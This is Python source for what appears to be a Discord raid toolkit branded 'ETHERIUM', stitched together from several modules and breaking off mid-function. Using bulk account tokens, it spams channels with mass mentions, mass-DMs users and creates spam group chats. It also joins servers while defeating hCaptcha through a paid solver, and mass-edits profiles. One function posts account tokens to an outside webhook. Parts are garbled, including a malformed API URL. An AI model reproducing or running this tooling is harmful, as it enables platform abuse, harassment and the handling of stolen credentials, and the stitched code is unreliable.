from core.utils   import *
from core.spammer import *
import websocket
from websocket import WebSocket
import pyautogui



success = 0
failure = 0

def get_server_members(token, server_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}/members'
    headers = {"Authorization": token}
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"{COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| Successfully retrieved members with token ending in {token[-4:]}.")
            return [member['user']['id'] for member in response.json()]
        else:
            print(f"{ERRORM}Error {response.status_code}: Unable to retrieve members with token ending in {token[-4:]}.")
            return []
    except Exception as e:
        print(f"{ERRORM}Error fetching server members with token ending in {token[-4:]}: {e}")
        return []


def ChannelSpammer():
    global success, failure

    try:
        with open('stats/input/tokens.txt', 'r') as f:
            tokens = f.read().splitlines()
    except FileNotFoundError:
        os.system("cls")
        print(f"{TYPE} No tokens found in stats/input/tokens.txt")
        return

    parsed_tokens = [token.split(":")[-1] if ":" in token else token for token in tokens]
    
    mention_choice = input(f"\n{INPUT} Mentions | Y/N > {COLORAMA_WHITE} ")

    member_ids = []
    if mention_choice.lower() in ['y', 'yes', 'yh', 'yah', 'yep']:
        try:
            with open('stats/output/memberids.txt', 'r') as f:
                member_ids = f.read().splitlines()
        except FileNotFoundError:
            print(f"{ERRORM} No member IDs found in stats/output/memberids.txt")
            input(f"\n                                        {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Press ENTER to go back.")
            main_menu()

    os.system("cls")
    MainBanner()
    CHANNEL_ID = input(f"{INPUT} CHANNEL ID >{COLORAMA_WHITE} ")
    os.system("cls")
    MainBanner()
    MESSAGE = input(f"{INPUT} MESSAGE {COLORAMA_GRAY}>{COLORAMA_WHITE} ")
    os.system("cls")
    MainBanner()
    PONG = input(f"{INPUT} EMOJIS >{COLORAMA_WHITE} ")
    pong_number = int(PONG)

    if pong_number >= 70:
        os.system("cls")
        MainBanner()
        print(f"{TYPE} MAX AMOUNT ~ 71")
        time.sleep(0.7)
        return

    if not (CHANNEL_ID and MESSAGE):
        os.system("cls")
        MainBanner()
        print(f"                                  {COLOR_L1}[{COLORAMA_RED}ERROR{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Inputs cannot be empty.")
        input(f"\n                                        {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L}]{COLORAMA_GRAY}>{COLORAMA_WHITE} Press ENTER to go back.")
        main_menu()

    os.system("cls")
    MainBanner
    message_amount = input(f"{INPUT} AMOUNT >{COLORAMA_WHITE} ")

    try:
        message_amount = int(message_amount)
        delay_time = float(0) 
    except ValueError:
        print(f"{ERRORM} Invalid input, setting number of messages to 1 and delay to 0.")
        message_amount = 1
        delay_time = 0

    os.system("cls")
    MainBanner()
    url = f'https://discord.com/api/v9/channels/{CHANNEL_ID}/messages'

    def send_message(token):
        global success, failure

        for _ in range(message_amount):
            if mention_choice.lower() in ['y', 'yes', 'yh', 'yah', 'yep']:
                mentions = random.sample(member_ids, min(len(member_ids), pong_number))
                mention_content = " ".join([f"<@{member}>" for member in mentions])
                message_with_mentions = f'**`{MESSAGE}`** `|` {mention_content}'
            else:
                ezem = random.sample(emojilist, pong_number)
                emmen = " ".join([f"{em}" for em in ezem])
                message_with_mentions = f'{emmen} ~ `{MESSAGE}`'

            data = {'content': message_with_mentions}
            sesheaders = headers.copy()
            sesheaders.update({"Authorization": token})

            try:
                response = requests.post(url, json=data, headers=sesheaders)

                if response.status_code in [200, 201, 204]:
                    success += 1
                    print(f"                                        {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lg}[{g}SUCCESS{lg}] {COLORAMA_GRAY}| {COLORAMA_WHITE}{token[:37]} {COLOR_L1}[{COLOR_L}{response.status_code}{COLOR_L1}]")
                elif response.status_code == 429:  
                    print(f"{ERRORM} Rate limit hit for token: {token[:37]}")
                    time.sleep(2)
                    continue
                else:
                    failure += 1
                    print(f"                                        {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lr}[{r}FAILURE{lr}] {COLORAMA_GRAY}| {COLORAMA_WHITE}{token[:37]} {COLOR_L1}[{COLOR_L}{response.status_code}{COLOR_L1}]")
            except Exception as e:
                failure += 1
                print(f"                      {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lr}[{r}ERROR{lr}]   {COLORAMA_GRAY}| {COLORAMA_WHITE}{token[:37]} {COLOR_L1}[{COLOR_L}{e}{COLOR_L1}]")

            time.sleep(delay_time)  

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(send_message, token) for token in parsed_tokens]

        for future in concurrent.futures.as_completed(futures):
            future.result()

    os.system("cls")
    MainBanner()
    print(f'                                        {COLOR_L1}[{COLORAMA_WHITE}Type "show" for info or press "enter" to go back]{COLOR_L1}\n')
    choose = input(f"                               {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L}]{COLORAMA_GRAY}>{COLORAMA_WHITE} ")

    if choose == "show":
        os.system("cls")
        MainBanner()
        print(f"""                            {lg}[{g}SUCCESS{lg}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}{success:04}{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Sent the messages to the channel.
                            {lr}[{r}FAILURE{lr}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}{failure:04}{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Failed to send the messages.\n""")

        input(f"\n                                        {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Press ENTER to go back.")
    
    elif choose == "":
        main_menu()

from core.utils import *

s = Fore.LIGHTBLACK_EX
g = Fore.GREEN
w = Fore.WHITE 
b = Fore.BLUE
r = Fore.RED
y = Fore.YELLOW

import                  aiohttp
import                  base64
import                  colorama
import                  concurrent.futures
import                  ctypes
import                  discord
import                  easygui
import                  hashlib
import                  httpx
import                  json
import                  os
import                  platform
import                  random
import                  re
import                  requests
import                  shutil
import                  string
import                  subprocess
import                  sys
import                  time
import                  typing
import                  urllib
import                  websocket
import                  yaml
import                  tls_client
import                  time

from                    ab5                    import vgratient
from                    colorama               import Fore, Style
from                    concurrent.futures     import ThreadPoolExecutor, as_completed
from                    dataclasses            import dataclass
from                    datetime               import datetime
from                    discum                 import *
from                    itertools              import cycle
from                    json                   import dumps, loads
from                    pystyle                import *
from                    tls_client             import Session
from                    twocaptcha             import TwoCaptcha
from                    time                   import sleep

def get_two_captcha_api_key():
    with open('config.yaml', 'r') as file:
        config = yaml.safe_load(file)
    return config['SOLVER']['solver']

twocaptchakey = get_two_captcha_api_key()
solver = TwoCaptcha(twocaptchakey)

headers = {
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'sv,sv-SE;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'referer': 'https://discord.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': 'sv-SE',
    'x-discord-timezone': 'Europe/Stockholm',
    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InN2IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTYgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMTg2MDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM1MjM2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
}

@dataclass
class JoinerData:
    pass

@dataclass
class Instance(JoinerData):
    client: tls_client.sessions
    token: str
    invite: str
    headers: dict


class Joiner:

    def __init__(self, data: Instance) -> None:
        self.session = data.client
        self.session.headers = data.headers
        self.get_cookies()
        self.instance = data

    def rand_str(self, length: int) -> str:
        return "".join(random.sample(string.ascii_lowercase + string.digits, length))

    def get_cookies(self) -> None:
        site = self.session.get("https://discord.com")
        self.session.cookies = site.cookies

    def solve(self, websiteURL, websiteKey, rqdata) -> object:
        result = solver.hcaptcha(sitekey=websiteKey, url=websiteURL, data=rqdata, invisible=1)
        return result

    def joinCap(self, rq_token, code) -> None:
        self.session.headers.update({"Authorization": self.instance.token})
        self.session.headers.update({"X-Captcha-Key": code})
        self.session.headers.update({"X-Captcha-Rqtoken": rq_token})
        result = self.session.post(
            f"https://discord.com/api/v9/invites/{self.instance.invite}",
            json={
                "session_id": self.rand_str(32),
            },
        )
        if result.status_code == 200:
            print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_GREEN}BYPASSED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {b}[{result.status_code}]{w}")
        else:
            print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_RED}FAILED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {r}[{result.status_code}]{w}")
            print(f'{s}{result.json()}')
  

    def join(self) -> None:
        self.session.headers.update({"Authorization": self.instance.token})
        result = self.session.post(
            f"https://discord.com/api/v9/invites/{self.instance.invite}",
            json={
                "session_id": self.rand_str(32),
            },
        )
        if result.status_code == 200:
            print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_GREEN}JOINED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {g}[{result.status_code}]{w}")
        else:
            json_result = result.json()
            print(f'{s}{json_result}')
            if "captcha_key" in json_result:
                print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_YELLOW}SOLVING CAPTCHA{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {y}[{result.status_code}]{w}")
                rq_token = json_result["captcha_rqtoken"]
                rqdata = json_result['captcha_rqdata']
                this_solution = self.solve(f"https://discord.com/", json_result["captcha_sitekey"], rqdata)
                code = this_solution["code"]
                self.joinCap(rq_token, code)
            else:
                print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_RED}FAILED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {r}[{result.status_code}]{w}")

class intilize:
    def start(i):
        Joiner(i).join()

def TknJoiner():

    with open('stats/input/tokens.txt', 'r') as file:
        tokens = [line.strip() for line in file]

    instances = []
    invite = input(f"{INPUT} discord.gg/")

    for i in range(len(tokens)):
        header = headers
        instances.append(Instance(
            client=tls_client.Session(
            client_identifier=f"chrome_{random.randint(110,115)}",
            random_tls_extension_order=True
        ),
            token=tokens[i],
            headers=header,
            invite=invite
        ))

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(intilize.start, i) for i in instances]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_RED}FAILED{COLOR_L}] {COLORAMA_GRAY}> {e}")





success = 0
failure = 0

def BioChanger():
    global success, failure
    success = 0
    failure = 0

    bio = input(f"{INPUT} BIO {COLORAMA_GRAY}>{COLORAMA_WHITE} ")

    os.system("cls")
    MainBanner()

    if bio == "" or bio is None:
        bio = "discord.gg/novex"
    else:
        bio = bio

    def bio_changer(token):
        global success, failure
        
        payload = {
            "bio": bio
        }

        sesheaders = headers.copy()
        sesheaders.update({'Authorization': token})

        response = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=sesheaders, json=payload)
        

        if response.status_code in [200, 202]:
                success += 1
                print(f"                      {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lg}[{g}SUCCESS{lg}] {COLORAMA_GRAY}| {COLORAMA_WHITE}{token[:37]} {COLOR_L1}[{COLOR_L}{response.status_code}{COLOR_L1}]")
        else:
                failure += 1
                print(f"                      {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lr}[{r}FAILURE{lr}] {COLORAMA_GRAY}| {COLORAMA_WHITE}{token[:37]} {COLOR_L1}[{COLOR_L}{response.status_code}{COLOR_L1}]")

    tokens = getting.get_tokens() 

    parsed_tokens = []
    for token in tokens:
        if ':' in token:
            parts = token.split(':')
            parsed_tokens.append(parts[-1])
        else:
            parsed_tokens.append(token)

    num_threads = getting.get_num_threads()

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(bio_changer, parsed_tokens)

    os.system("cls")
    MainBanner()
    print(f'                              {COLOR_L1}[{COLORAMA_WHITE}Type "show" for info or press "enter" to go back]{COLOR_L1}\n')
    choose = input(f"                               {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} ")

    if choose == "show":
        os.system("cls")
        MainBanner()
        print(f"""                            {lg}[{g}SUCCESS{lg}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}{success:03}{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Changed bio of the token.
                            {lr}[{r}FAILURE{lr}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}{failure:03}{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Failed to change bio of the token.""")
        input(f"\n                                        {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {COLORAMA_GRAY}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {COLORAMA_GRAY}>{COLORAMA_WHITE} Press ENTER to go back.")
    
    elif choose == "":
        main_menu()


def NameChanger():

    
    global success, failure
    success = 0
    failure = 0
    
    def changenick(server, nickname, token):
        global success, failure

        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token})

        response = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=sesheaders, json={"nick": nickname})
        if response.status_code == 200:
            success +=1
            print(f"                      {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lg}[{g}SUCCESS{lg}] {s}|{w} {token[:37]} {COLOR_L1}[{COLOR_L}{response.status_code}{COLOR_L1}]")
        else:
            failure +=1
            print(f"                      {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lr}[{r}FAILURE{lr}] {s}|{w} {token[:37]} {COLOR_L1}[{COLOR_L}{response.status_code}{COLOR_L1}]")

    
    tokens = getting.get_tokens()
    server = input(f"                                   {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}GUILD ID{COLOR_L1}] {s}>{w} ")
    nick = input(f"                                   {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}USERNAME{COLOR_L1}] {s}>{w} ")

    if not (server and nick):
        clearprint()
        print(f"                                  {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}ERROR{COLOR_L1}] {s}>{w} Inputs cannot be empty.")
        sleep(0.7)
        return
    
    clearprint()

    # Getting number of threads from config.ini
    num_threads = getting.get_num_threads()

    threads = []
    for token in tokens:
        t = threading.Thread(target=changenick, args=(server, nick, token)) 
        threads.append(t)
        t.start()
        
        # Limit number of concurrent threads
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    clearprint()

    print(f'                              {COLOR_L1}[{w}Type {COLOR_L1}"{COLOR_L}show{COLOR_L1}"{w} for info or press {COLOR_L1}"{COLOR_L}enter{COLOR_L1}"{w} to go back{COLOR_L1}]\n')
    choose = input(f"                               {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {s}>{w} ")

    if choose == "show":
        clearprint()
        print(f"""                       {lg}[{g}SUCCESS{lg}] {s}| {COLOR_L1}[{COLOR_L}{success:03}{COLOR_L1}] {s}>{w} Changed the name of the token in the server!
                       {lr}[{r}FAILURE{lr}] {s}| {COLOR_L1}[{COLOR_L}{failure:03}{COLOR_L1}] {s}>{w} Failed to change the name of the token!""")
        input(f"\n                       {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {s}>{w} Press ENTER to go back.")
    
    elif choose == "":
        pass

def GuildLeaver():

    ID = input(f"                                   {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}GUILD ID{COLOR_L1}] {s}>{w} ")

    if not ID:
        print(f"                                  {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}ERROR{COLOR_L1}] {s}>{w} Inputs cannot be empty.")
        sleep(0.7)
        return
    

    apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)
    threads = []
    tokens = getting.get_tokens()  

    for token in tokens:
        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token.strip()})

        print(f"                      {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lg}[{g}SUCCESS{lg}] {s}|{w} {token[:37]} {COLOR_L1}[{COLOR_L}+++{COLOR_L1}]")

        num_threads = getting.get_num_threads()

        t = threading.Thread(target=requests.delete, args=(apilink,), kwargs={'headers': sesheaders})
        threads.append(t)
        t.start()
        
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    print(f'                             {COLOR_L1}[{w}Tokens left the server, try again if some did not{COLOR_L1}]')
    input(f"\n                              {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {s}>{w} Press ENTER to go back.")

valid_tokens = []
invalid_tokens = []
locked_tokens = []

# File path for tokens
token_file = 'stats/input/tokens.txt'

def load_tokens(file_path):
    tokens = []
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                # Check if format is `email:pass:token`
                if ':' in line:
                    parts = line.split(':')
                    token = parts[-1]  # Assume the last part is the token
                else:
                    token = line
                tokens.append(token)
    return tokens

def check_token(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    
    if response.status_code == 200:
        return 'valid'
    elif response.status_code == 401:
        return 'invalid'
    elif response.status_code == 403:
        return 'locked'
    else:
        return 'unknown'

def Checker():
    tokens = load_tokens(token_file)
    valid_tokens = []



    for token in tokens:
        status = check_token(token)
        if status == 'valid':
            valid_tokens.append(token)
            print(f"                     {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lg}[{g}VALID{lg}]   {s}|{w} {token[:37]}")
        elif status == 'invalid':
            print(f"                     {COLOR_L1}[{COLOR_L}{COLOR_L1}] {lr}[{r}INVALID{lr}] {s}|{w} {token[:37]} ")
        elif status == 'locked':
            print(f"                     {COLOR_L1}[{COLOR_L}{COLOR_L1}] {ly}[{y}LOCKED{ly}]{y}  {s}|{w} {token[:37]} ")
        else:
            print(f"                     {COLOR_L1}[{COLOR_L}{COLOR_L1}] {ly}[{y}ERROR{ly}]{y}  {s}|{w} {token[:37]}")


    with open(token_file, 'w') as f:
        for token in valid_tokens:
            f.write(token + '\n')

    print(f"                     {COLOR_L1}[{COLOR_L}{COLOR_L1}] {ly}[{y}SAVED VALID TO DIR{ly}]{y}")
    input(f"\n                              {COLOR_L1}[{COLOR_L}ETHERIUM{COLOR_L1}] {s}| {COLOR_L1}[{COLOR_L}INPUT{COLOR_L1}] {s}>{w} Press ENTER to go back.")


token_file = 'stats/input/tokens.txt'

class Formatter:
    def __init__(self, file_path):
        self.file_path = file_path

    def format_tokens(self):
        formatted_tokens = []

        with open(self.file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:

                    if ':' in line:
                        parts = line.split(':')
                        token = parts[-1] 
                    else:
                        token = line
                    formatted_tokens.append(token)


        with open(self.file_path, 'w') as f:
            for token in formatted_tokens:
                f.write(token + '\n')

        print(f"                     {COLOR_L1}[{COLOR_L}{COLOR_L1}] {ly}[{y}SAVED FORMATTED TO DIR{ly}]{y}")
        time.sleep(1)

# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

try:
    import requests
except Exception as e:
   (e)
   


try:

 def GuildChecker():
    invite = input(f"{INPUT} Server Invitation > {Fore.RESET}")
    try:
        invite_code = invite.split("/")[-1]
    except:
        invite_code = invite

    response = requests.get(f"https://discord.com/api/v9/invites/{invite_code}")

    if response.status_code == 200:
        api = response.json()

        type_value = api.get('type', "None")
        code_value = api.get('code', "None")
        inviter_info = api.get('inviter', {})
        inviter_id = inviter_info.get('id', "None")
        inviter_username = inviter_info.get('username', "None")
        inviter_avatar = inviter_info.get('avatar', "None")
        inviter_discriminator = inviter_info.get('discriminator', "None")
        inviter_public_flags = inviter_info.get('public_flags', "None")
        inviter_flags = inviter_info.get('flags', "None")
        inviter_banner = inviter_info.get('banner', "None")
        inviter_accent_color = inviter_info.get('accent_color', "None")
        inviter_global_name = inviter_info.get('global_name', "None")
        inviter_banner_color = inviter_info.get('banner_color', "None")
        expires_at = api.get('expires_at', "None")
        flags = api.get('flags', "None")
        server_info = api.get('guild', {})
        server_id = server_info.get('id', "None")
        server_name = server_info.get('name', "None")
        server_icon = server_info.get('icon', "None")
        server_features = server_info.get('features', "None")
        if server_features != "None":
            server_features = ' / '.join(server_features)
        server_verification_level = server_info.get('verification_level', "None")
        server_nsfw_level = server_info.get('nsfw_level', "None")
        server_descritpion = server_info.get('description', "None")
        server_nsfw = server_info.get('nsfw', "None")
        server_premium_subscription_count = server_info.get('premium_subscription_count', "None")
        channel_info = api.get('channel', {})
        channel_id = channel_info.get('id', "None")
        channel_type = channel_info.get('type', "None")
        channel_name = channel_info.get('name', "None")
    else:
        print(f"{TYPE} ERROR")

    print(f"""{COLOR_L}
    Invitation Information:
    {TYPE} Invitation         : {COLORAMA_WHITE}{invite}{COLOR_L1}
    {TYPE} Code               : {COLORAMA_WHITE}{code_value}{COLOR_L1}
    {TYPE} Expired            : {COLORAMA_WHITE}{expires_at}{COLOR_L1}
    {TYPE} Server ID          : {COLORAMA_WHITE}{server_id}{COLOR_L1}
    {TYPE} Server Name        : {COLORAMA_WHITE}{server_name}{COLOR_L1}
    {TYPE} Channel ID         : {COLORAMA_WHITE}{channel_id}{COLOR_L1}
    {TYPE} Channel Name       : {COLORAMA_WHITE}{channel_name}{COLOR_L1}
    {TYPE} Channel Type       : {COLORAMA_WHITE}{channel_type}{COLOR_L1}
    {TYPE} Server Description : {COLORAMA_WHITE}{server_descritpion}{COLOR_L1}
    {TYPE} Server Icon        : {COLORAMA_WHITE}{server_icon}{COLOR_L1}
    {TYPE} Server Features    : {COLORAMA_WHITE}{server_features}{COLOR_L1}
    {TYPE} Server NSFW Level  : {COLORAMA_WHITE}{server_nsfw_level}{COLOR_L1}
    {TYPE} Server NSFW        : {COLORAMA_WHITE}{server_nsfw}{COLOR_L1}
    {TYPE} Flags              : {COLORAMA_WHITE}{flags}{COLOR_L1}
    {TYPE} Server Verification Level         : {COLORAMA_WHITE}{server_verification_level}{COLOR_L1}
    {TYPE} Server Premium Subscription Count : {COLORAMA_WHITE}{server_premium_subscription_count}{COLOR_L1}
""")

    if inviter_info:
        print(f"""    {COLOR_L1}Inviter Information:
    {TYPE} ID            : {COLORAMA_WHITE}{inviter_id}{COLOR_L1}
    {TYPE} Username      : {COLORAMA_WHITE}{inviter_username}{COLOR_L1}
    {TYPE} Global Name   : {COLORAMA_WHITE}{inviter_global_name}{COLOR_L1}
    {TYPE} Avatar        : {COLORAMA_WHITE}{inviter_avatar}{COLOR_L1}
    {TYPE} Discriminator : {COLORAMA_WHITE}{inviter_discriminator}{COLOR_L1}
    {TYPE} Public Flags  : {COLORAMA_WHITE}{inviter_public_flags}{COLOR_L1}
    {TYPE} Flags         : {COLORAMA_WHITE}{inviter_flags}{COLOR_L1}
    {TYPE} Banner        : {COLORAMA_WHITE}{inviter_banner}{COLOR_L1}
    {TYPE} Accent Color  : {COLORAMA_WHITE}{inviter_accent_color}{COLOR_L1}
    {TYPE} Banner Color  : {COLORAMA_WHITE}{inviter_banner_color}{COLOR_L1}
    """)
        
    input(f"{INPUT} PRESS ENTER TO CONTINUE")
    main_menu()
except Exception as e:
    (e)


    import requests
    import threading
except Exception as e:
   (e)
   
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import time

def check_token(token):
    """Check if a Discord token is valid."""
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    return response.status_code == 200

def send_embed(webhook_url, token):
    """Send a token in an embed via the webhook URL."""
    webhook = DiscordWebhook(url=webhook_url)

    # Create embed
    embed = DiscordEmbed(
        title="New Token Sent",
        description=f"Token: ||{token}||",
        color="03b2f8"
    )
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1301530370059014196/1301697098244296735/1723391532511.png?ex=672caba4&is=672b5a24&hm=aa4eeb81eb33094385b49790d2a63d219c574ed6d0a409f0c0c50e95f1ce1376&=&format=webp&quality=lossless&width=676&height=676")  # Replace with a valid thumbnail URL if desired
    embed.add_embed_field(name="Status", value="Valid")

    # Add embed to webhook and send
    webhook.add_embed(embed)
    response = webhook.execute()
    if response.status_code == 204:
        print(f"{TYPE} Token sent successfully: {COLOR_L}[{token[-20:]}]")
    else:
        print(f"{TYPE} Token sent successfully: {COLOR_L}[{COLORAMA_GREEN}{token[-25:]}{COLOR_L}]")


def inliner():
    webhook_url = input(f"{INPUT} Enter the Discord Webhook URL > {COLOR_L1} ")

    # Read tokens from file
    with open("stats/input/tokens.txt", "r") as file:
        tokens = [line.strip() for line in file]

    # Process each token
    for token in tokens:
        if check_token(token):
            send_embed(webhook_url, token)
            time.sleep(1)  # To prevent rate limits
        else:
            print(f"{TYPE} Invalid token: {COLORAMA_RED}{token[-50:]}")


try:
    def MassDM(token_discord, channels, message):
        for channel in channels:
            for user in [x["username"] + "#" + x["discriminator"] for x in channel["recipients"]]:
                try:
                    response = requests.post(
                        f"https://discord.com/api/v9/channels/{channel['id']}/messages",
                        headers={'Authorization': token_discord},
                        data={"content": f"{message}"}
                    )
                    if response.status_code == 200:
                        print(f"{TYPE} Status: Message sent to {user}")
                    else:
                        print(f"{TYPE} Failed to send message to {user}: {response.status_code}")
                except Exception as e:
                    print(f"{TYPE} Error sending to {user}: {e}")

    def MassDm():

        
        token_discord = input(f"{INPUT} Enter your Discord token >  ").strip()
        validityTest = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers={'Authorization': token_discord, 'Content-Type': 'application/json'}
        )
        if validityTest.status_code != 200:
            print(f"{TYPE} Invalid token")
            return

        message = input(f"{INPUT} Message > ")
        try:
            repetition = int(input(f"{INPUT} Number of Repetitions > "))
        except ValueError:
            print(f"{TYPE} Invalid number for repetitions")
            return

        # Fetch channels
        channels_response = requests.get(
            "https://discord./api/vcom9/users/@me/channels",
            headers={'Authorization': token_discord}
        )
        channel_ids = channels_response.json()
        
        if not channel_ids:
            print(f"{TYPE} No channels available for DM")
            return
        
        processes = []
        for i in range(repetition):
            for channel_batch in [channel_ids[i:i + 3] for i in range(0, len(channel_ids), 3)]:
                t = threading.Thread(target=MassDM, args=(token_discord, channel_batch, message))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            print(f"{TYPE} Completed repetition {i + 1} of {repetition}")
            time.sleep(0.5)
        
        print("\n--- Mass DM Completed ---\n")
        input(f"{INPUT} Press ENTER to return to the main menu")



except Exception as e:
    print(f"{TYPE} An unexpected error occurred: {e}")


def group_chat_spammer():


    # Gather user input
    token = input(f"{INPUT} Token > {COLOR_L}[{COLOR_L1}INPUT HIDDEN{COLOR_L}] {Fore.BLACK} ")
    user_id = input(f"{INPUT} User ID >  ")
    group_name = input(f"{INPUT} Group Name > ")
    group_count = int(input(f"{INPUT} How Many Groups >  "))

    # Initialize headers
    headers = {"Authorization": token, "Content-Type": "application/json"}

    # Loop for creating the requested number of groups
